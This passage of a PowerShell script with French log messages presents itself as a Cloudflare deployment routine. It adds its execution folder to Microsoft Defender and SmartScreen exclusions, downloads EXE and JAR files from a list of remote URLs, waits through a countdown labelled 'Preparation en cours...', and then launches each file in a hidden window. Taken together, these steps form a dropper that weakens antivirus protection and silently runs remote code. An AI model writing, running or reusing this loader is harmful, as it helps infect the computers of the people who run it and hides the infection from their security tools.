Write-Log "Whitelist: Ajout du chemin d'execution: $ExecutionPath" "Info"
$whitelistJob2 = Start-Job -ScriptBlock {
    param($Path)
    function Add-Whitelist {
        param([string]$Path)
        $successCount = 0
        if (-not (Test-Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
        }
        try {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            $successCount++
        } catch {}
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            $exclusionName = $Path -replace '\\', '_'
            Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
            $successCount++
        } catch {}
        return $successCount
    }
    return Add-Whitelist -Path $Path
} -ArgumentList $ExecutionPath

$whitelistResult2 = Wait-Job $whitelistJob2 -Timeout 30
if ($whitelistResult2) {
    $count = Receive-Job $whitelistJob2
    Remove-Job $whitelistJob2 -Force
    Write-Log "Whitelist ExecutionPath: $count exclusion(s) ajoutee(s)" "Success"
} else {
    Write-Log "Whitelist ExecutionPath: Timeout, continuation..." "Warning"
    Stop-Job $whitelistJob2 -ErrorAction SilentlyContinue
    Remove-Job $whitelistJob2 -Force
}

# ============================= PHASE 3: TÉLÉCHARGEMENT =============================

Write-Log "=== PHASE 3: TELECHARGEMENT DES FICHIERS ===" "Info"

function Download-File {
    param([string]$Url, [string]$OutputPath, [int]$MaxRetries, [int]$TimeoutSeconds)
    
    if ([string]::IsNullOrWhiteSpace($Url)) {
        Write-Log "URL vide ou invalide" "Error"
        return $false
    }
    
    if ([string]::IsNullOrWhiteSpace($OutputPath)) {
        Write-Log "Chemin de sortie vide ou invalide" "Error"
        return $false
    }
    
    # S'assurer que le dossier parent existe
    $outputDir = Split-Path -Path $OutputPath -Parent
    if (-not (Test-Path $outputDir)) {
        try {
            New-Item -ItemType Directory -Path $outputDir -Force -ErrorAction Stop | Out-Null
        } catch {
            Write-Log "Impossible de creer le dossier: $outputDir - $($_.Exception.Message)" "Error"
            return $false
        }
    }
    
    $retryCount = 0
    $fileName = Split-Path $Url -Leaf
    if ([string]::IsNullOrWhiteSpace($fileName)) {
        $fileName = "file_" + [System.Guid]::NewGuid().ToString("N").Substring(0, 8)
    }
    
    while ($retryCount -lt $MaxRetries) {
        try {
            $attemptNumber = $retryCount + 1
            Write-Log "Tentative ${attemptNumber}/${MaxRetries}: $fileName" "Info"
            
            # Vérifier l'URL
            if (-not (Test-UrlAccess -Url $Url -TimeoutSeconds 15)) {
                throw "URL inaccessible"
            }
            
            # Supprimer le fichier existant s'il existe
            if (Test-Path $OutputPath) {
                try {
                    Remove-Item -Path $OutputPath -Force -ErrorAction Stop
                    Start-Sleep -Milliseconds 500
                } catch {
                    Write-Log "Impossible de supprimer le fichier existant, tentative de telechargement par-dessus" "Warning"
                }
            }
            
            # Configuration TLS
            [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
            
            # Télécharger avec gestion d'erreurs améliorée et timeout pour éviter le blocage
            $tempFile = $OutputPath + ".tmp"
            $downloadTimeout = [math]::Min($TimeoutSeconds, 180)  # Max 3 minutes par fichier
            
            try {
                # Utiliser un job avec timeout pour éviter le blocage
                $downloadJob = Start-Job -ScriptBlock {
                    param($Uri, $OutFile, $Timeout)
                    try {
                        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
                        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
                        return $true
                    } catch {
                        return $false
                    }
                } -ArgumentList $Url, $tempFile, $downloadTimeout
                
                $downloadResult = Wait-Job $downloadJob -Timeout ($downloadTimeout + 10)
                if ($downloadResult) {
                    $success = Receive-Job $downloadJob
                    Remove-Job $downloadJob -Force
                    if (-not $success) {
                        throw "Echec telechargement"
                    }
                } else {
                    # Timeout - nettoyer et continuer
                    Write-Log "Telechargement: Timeout apres $downloadTimeout secondes" "Warning"
                    Stop-Job $downloadJob -ErrorAction SilentlyContinue
                    Remove-Job $downloadJob -Force
                    if (Test-Path $tempFile) {
                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                    }
                    throw "Timeout telechargement"
                }
                
                # Vérifier que le fichier temporaire existe et n'est pas vide
                if (-not (Test-Path $tempFile)) {
                    throw "Fichier temporaire non cree"
                }
                
                $tempFileInfo = Get-Item $tempFile -ErrorAction Stop
                if ($tempFileInfo.Length -eq 0) {
                    Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                    throw "Fichier vide"
                }
                
                # Renommer le fichier temporaire en fichier final
                Move-Item -Path $tempFile -Destination $OutputPath -Force -ErrorAction Stop
                
            } catch {
                if (Test-Path $tempFile) {
                    Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
                }
                throw
            }
            
            # Vérification finale
            if (-not (Test-Path $OutputPath)) {
                throw "Fichier final non cree"
            }
            
            $fileInfo = Get-Item $OutputPath -ErrorAction Stop
            if ($fileInfo.Length -eq 0) {
                Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
                throw "Fichier vide apres deplacement"
            }
            
            $fileSizeMB = [math]::Round($fileInfo.Length / 1MB, 2)
            Write-Log "Telecharge: $fileName ($fileSizeMB MB)" "Success"
            return $true
        } catch {
            $retryCount++
            if ($retryCount -lt $MaxRetries) {
                $waitTime = [math]::Min(5 * $retryCount, 30)
                Write-Log "Erreur: $($_.Exception.Message). Nouvelle tentative dans $waitTime secondes..." "Warning"
                Start-Sleep -Seconds $waitTime
            } else {
                Write-Log "Erreur finale apres $MaxRetries tentatives: $($_.Exception.Message)" "Error"
                # Nettoyer en cas d'échec final
                if (Test-Path $OutputPath) {
                    Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
                }
                return $false
            }
        }
    }
    return $false
}

# S'assurer que le dossier de téléchargement existe
if (-not (Test-Path $DownloadPath)) {
    try {
        $parentPath = Split-Path -Path $DownloadPath -Parent
        if ($parentPath -and -not (Test-Path $parentPath)) {
            New-Item -ItemType Directory -Path $parentPath -Force -ErrorAction Stop | Out-Null
            Write-Log "Dossier parent cree: $parentPath" "Info"
        }
        New-Item -ItemType Directory -Path $DownloadPath -Force -ErrorAction Stop | Out-Null
        Write-Log "Dossier de telechargement cree: $DownloadPath" "Info"
    } catch {
        Write-Log "ERREUR CRITIQUE: Impossible de creer le dossier de telechargement: $DownloadPath - $($_.Exception.Message)" "Error"
        Write-Log "Utilisation du dossier temporaire comme fallback" "Warning"
        $DownloadPath = $env:TEMP
    }
}

# Vérifier les permissions d'écriture pour le téléchargement
try {
    $testFile = Join-Path $DownloadPath ".write_test_$([DateTime]::Now.Ticks).tmp"
    New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
    Remove-Item -Path $testFile -Force -ErrorAction Stop
    Write-Log "Permissions d'ecriture verifiees pour telechargement: $DownloadPath" "Success"
} catch {
    Write-Log "ERREUR: Pas de permissions d'ecriture dans: $DownloadPath - $($_.Exception.Message)" "Error"
    Write-Log "Utilisation du dossier temporaire comme fallback" "Warning"
    $DownloadPath = $env:TEMP
    $script:LogFile = Join-Path $DownloadPath "cloudflare_deploy_log.txt"
}

# S'assurer que le dossier d'exécution existe (indépendant)
if (-not (Test-Path $ExecutionPath)) {
    try {
        $parentPath = Split-Path -Path $ExecutionPath -Parent
        if ($parentPath -and -not (Test-Path $parentPath)) {
            New-Item -ItemType Directory -Path $parentPath -Force -ErrorAction Stop | Out-Null
            Write-Log "Dossier parent execution cree: $parentPath" "Info"
        }
        New-Item -ItemType Directory -Path $ExecutionPath -Force -ErrorAction Stop | Out-Null
        Write-Log "Dossier d'execution cree: $ExecutionPath" "Info"
    } catch {
        Write-Log "ERREUR CRITIQUE: Impossible de creer le dossier d'execution: $ExecutionPath - $($_.Exception.Message)" "Error"
        Write-Log "Utilisation du dossier temporaire comme fallback" "Warning"
        $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
        New-Item -ItemType Directory -Path $ExecutionPath -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# Vérifier les permissions d'écriture pour l'exécution
try {
    $testFile = Join-Path $ExecutionPath ".write_test_exec_$([DateTime]::Now.Ticks).tmp"
    New-Item -Path $testFile -ItemType File -Force -ErrorAction Stop | Out-Null
    Remove-Item -Path $testFile -Force -ErrorAction Stop
    Write-Log "Permissions d'ecriture verifiees pour execution: $ExecutionPath" "Success"
} catch {
    Write-Log "ERREUR: Pas de permissions d'ecriture dans: $ExecutionPath - $($_.Exception.Message)" "Error"
    Write-Log "Utilisation du dossier temporaire comme fallback" "Warning"
    $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
    New-Item -ItemType Directory -Path $ExecutionPath -Force -ErrorAction SilentlyContinue | Out-Null
}

Write-Log "Chemin de telechargement: $DownloadPath" "Info"
Write-Log "Chemin d'execution: $ExecutionPath" "Info"

# Télécharger dans DownloadPath
$downloadedFiles = @()
foreach ($file in $GitHubFiles) {
    if (-not $file -or -not $file.Name -or -not $file.URL) {
        Write-Log "Fichier invalide dans la liste, ignore" "Warning"
        continue
    }
    
    # Normaliser le nom de fichier (supprimer les caractères invalides)
    $safeFileName = $file.Name -replace '[<>:"|?*]', '_'
    $downloadOutputPath = Join-Path $DownloadPath $safeFileName
    
    # Vérifier que le chemin final est valide
    try {
        $downloadOutputPath = [System.IO.Path]::GetFullPath($downloadOutputPath)
    } catch {
        Write-Log "Chemin invalide pour $($file.Name), utilisation du nom original" "Warning"
        $downloadOutputPath = Join-Path $DownloadPath $file.Name
    }
    
    Write-Log "Telechargement vers: $downloadOutputPath" "Info"
    
    # Télécharger avec timeout global pour éviter le blocage
    $fileDownloadTimeout = 300  # 5 minutes max par fichier
    $downloadStartTime = Get-Date
    
    $result = $false
    try {
        $result = Invoke-WithRetry -ScriptBlock {
            Download-File -Url $file.URL -OutputPath $downloadOutputPath -MaxRetries $MaxRetries -TimeoutSeconds $TimeoutSeconds
        } -MaxRetries 2 -OperationName "Telechargement $($file.Name)"
        
        # Vérifier le timeout global
        $elapsed = (Get-Date) - $downloadStartTime
        if ($elapsed.TotalSeconds -gt $fileDownloadTimeout) {
            Write-Log "Telechargement $($file.Name): Timeout global ($fileDownloadTimeout s), passage au suivant" "Warning"
            $result = $false
        }
    } catch {
        Write-Log "Telechargement $($file.Name): Erreur - $($_.Exception.Message), passage au suivant" "Warning"
        $result = $false
    }
    
    if ($result) {
        # Copier vers le dossier d'exécution (indépendant)
        $executionOutputPath = Join-Path $ExecutionPath $safeFileName
        try {
            $executionOutputPath = [System.IO.Path]::GetFullPath($executionOutputPath)
            
            # Copier le fichier vers le dossier d'exécution avec timeout
            $copyTimeout = 60  # 1 minute max pour la copie
            $copyJob = Start-Job -ScriptBlock {
                param($Source, $Dest)
                try {
                    Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
                    return $true
                } catch {
                    return $false
                }
            } -ArgumentList $downloadOutputPath, $executionOutputPath
            
            $copyResult = Wait-Job $copyJob -Timeout $copyTimeout
            if ($copyResult) {
                $copySuccess = Receive-Job $copyJob
                Remove-Job $copyJob -Force
                if ($copySuccess) {
                    Write-Log "$($file.Name): Copie vers dossier d'execution: $executionOutputPath" "Info"
                } else {
                    throw "Echec copie"
                }
            } else {
                Write-Log "$($file.Name): Copie timeout, utilisation du fichier dans DownloadPath" "Warning"
                Stop-Job $copyJob -ErrorAction SilentlyContinue
                Remove-Job $copyJob -Force
                throw "Timeout copie"
            }
            
            $downloadedFiles += @{
                Name = $file.Name
                Path = $executionOutputPath  # Chemin d'exécution (indépendant)
                DownloadPath = $downloadOutputPath  # Chemin de téléchargement (pour référence)
                Type = $file.Type
            }
            Write-Log "$($file.Name): Telecharge et copie avec succes" "Success"
        } catch {
            Write-Log "ERREUR: Impossible de copier $($file.Name) vers $ExecutionPath - $($_.Exception.Message)" "Error"
            Write-Log "Utilisation du fichier dans le dossier de telechargement pour execution" "Warning"
            $downloadedFiles += @{
                Name = $file.Name
                Path = $downloadOutputPath  # Utiliser le fichier téléchargé directement
                DownloadPath = $downloadOutputPath
                Type = $file.Type
            }
        }
    } else {
        Write-Log "Echec telechargement: $($file.Name). Passage au suivant..." "Warning"
    }
}

Write-Log "Phase 3: $($downloadedFiles.Count)/$($GitHubFiles.Count) fichier(s) telecharge(s)" "Info"

# ============================= PHASE 4: COMPTE À REBOURS ET EXÉCUTION =============================

Write-Log "=== PHASE 4: COMPTE A REBOURS ($CountdownMinutes minutes) ===" "Info"

# Note: La validation de CountdownMinutes est déjà faite au début du script

$totalSeconds = $CountdownMinutes * 60
$startTime = Get-Date

Write-Log "Debut du compte a rebours: $totalSeconds secondes ($CountdownMinutes minutes)" "Info"

try {
    for ($i = $totalSeconds; $i -gt 0; $i--) {
        $minutes = [math]::Floor($i / 60)
        $seconds = $i % 60
        $percentComplete = if ($totalSeconds -gt 0) { (($totalSeconds - $i) / $totalSeconds) * 100 } else { 0 }
        
        # Afficher le compte à rebours (seulement toutes les 10 secondes pour réduire les logs)
        if ($i % 10 -eq 0 -or $i -le 10) {
            Write-Log "Compte a rebours: $minutes min $seconds sec restants" "Info"
        }
        
        # Barre de progression (silencieuse en mode caché mais fonctionne)
        try {
            Write-Progress -Activity "Preparation en cours..." -Status "Temps restant: $minutes min $seconds sec" -PercentComplete $percentComplete -SecondsRemaining $i -ErrorAction SilentlyContinue
        } catch {
            # Ignorer les erreurs de Write-Progress en mode silencieux
        }
        
        Start-Sleep -Seconds 1
    }
} catch {
    Write-Log "Erreur pendant le compte a rebours: $($_.Exception.Message)" "Error"
    # Continuer quand même
}

try {
    Write-Progress -Completed -Activity "Preparation en cours..." -ErrorAction SilentlyContinue
} catch {}

$endTime = Get-Date
$elapsedTime = ($endTime - $startTime).TotalSeconds
Write-Log "Compte a rebours termine. Duree reelle: $([math]::Round($elapsedTime, 2)) secondes" "Success"
Write-Log "Execution des fichiers..." "Info"

# Vérifier qu'il y a des fichiers à exécuter
if ($downloadedFiles.Count -eq 0) {
    Write-Log "Aucun fichier a executer. Arret du script." "Warning"
    exit 1
}

Write-Log "Nombre de fichiers a executer: $($downloadedFiles.Count)" "Info"

# Exécuter les fichiers
foreach ($file in $downloadedFiles) {
    try {
        Write-Log "Execution: $($file.Name)" "Info"
        
        # Vérification préalable du fichier
        if (-not $file.Path -or -not (Test-Path $file.Path)) {
            Write-Log "$($file.Name): Fichier introuvable - $($file.Path)" "Error"
            continue
        }
        
        $fileInfo = Get-Item $file.Path -ErrorAction Stop
        if ($fileInfo.Length -eq 0) {
            Write-Log "$($file.Name): Fichier vide - $($file.Path)" "Error"
            continue
        }
        
        Write-Log "$($file.Name): Fichier valide ($([math]::Round($fileInfo.Length / 1MB, 2)) MB)" "Info"
        
        if ($file.Type -eq "JAR") {
            # Exécuter JAR avec Java
            $javaExe = Get-Command java -ErrorAction SilentlyContinue
            if (-not $javaExe) {
                # Chercher Java dans les emplacements standards
                $javaPaths = @(
                    "C:\Program Files\Java",
                    "C:\Program Files (x86)\Java"
                )
                foreach ($javaPath in $javaPaths) {
                    if (Test-Path $javaPath) {
                        $javaDirs = Get-ChildItem -Path $javaPath -Directory -Filter "jdk*" -ErrorAction SilentlyContinue | Sort-Object -Property Name -Descending
                        foreach ($javaDir in $javaDirs) {
                            $javaExePath = Join-Path $javaDir.FullName "bin\java.exe"
                            if (Test-Path $javaExePath) {
                                $javaExe = @{ Source = $javaExePath }
                                break
                            }
                        }
                        if ($javaExe) { break }
                    }
                }
            }
            
            if ($javaExe) {
                # Normaliser le chemin pour éviter les problèmes avec les espaces
                $normalizedPath = [System.IO.Path]::GetFullPath($file.Path)
                $javaExePath = if ($javaExe.Source) { $javaExe.Source } else { $javaExe }
                
                Write-Log "$($file.Name): Lancement avec Java: $javaExePath" "Info"
                # Exécuter avec timeout pour éviter le blocage
                $execTimeout = 10  # 10 secondes max pour démarrer
                try {
                    $process = Start-Process -FilePath $javaExePath -ArgumentList "-jar", "`"$normalizedPath`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
                    
                    # Attendre un peu pour vérifier que le processus démarre
                    $startTime = Get-Date
                    while (-not $process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $execTimeout) {
                        Start-Sleep -Milliseconds 100
                    }
                    
                    if ($process -and $process.Id) {
                        Write-Log "$($file.Name): Lance avec Java (PID: $($process.Id))" "Success"
                    } elseif ($process) {
                        Write-Log "$($file.Name): Processus Java demarre mais PID non disponible" "Warning"
                    } else {
                        Write-Log "$($file.Name): Echec du lancement du processus Java" "Error"
                    }
                } catch {
                    Write-Log "$($file.Name): Erreur lancement Java - $($_.Exception.Message), passage au suivant" "Warning"
                }
            } else {
                Write-Log "$($file.Name): Java non trouve - fichier non execute" "Error"
            }
        } else {
            # Exécuter EXE
            # Normaliser le chemin pour éviter les problèmes avec les espaces
            $normalizedPath = [System.IO.Path]::GetFullPath($file.Path)
            
            Write-Log "$($file.Name): Lancement EXE: $normalizedPath" "Info"
            # Exécuter avec timeout pour éviter le blocage
            $execTimeout = 10  # 10 secondes max pour démarrer
            try {
                $process = Start-Process -FilePath $normalizedPath -WindowStyle Hidden -PassThru -ErrorAction Stop
                
                # Attendre un peu pour vérifier que le processus démarre
                $startTime = Get-Date
                while (-not $process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $execTimeout) {
                    Start-Sleep -Milliseconds 100
                }
                
                if ($process -and $process.Id) {
                    Write-Log "$($file.Name): Lance (PID: $($process.Id))" "Success"
                } elseif ($process) {
                    Write-Log "$($file.Name): Processus demarre mais PID non disponible" "Warning"
                } else {
                    Write-Log "$($file.Name): Echec du lancement du processus" "Error"
                }
            } catch {
                Write-Log "$($file.Name): Erreur lancement EXE - $($_.Exception.Message), passage au suivant" "Warning"
            }
        }
        
        Start-Sleep -Milliseconds 500
    } catch {
        Write-Log "Erreur execution $($file.Name): $($_.Exception.Message)" "Error"
    }
}

Write-Log "=== DEPLOIEMENT TERMINE ===" "Info"
Write-Log "Fichiers executes: $($downloadedFiles.Count)" "Info"
Write-Log "Log file: $script:LogFile" "Info"

exit 0

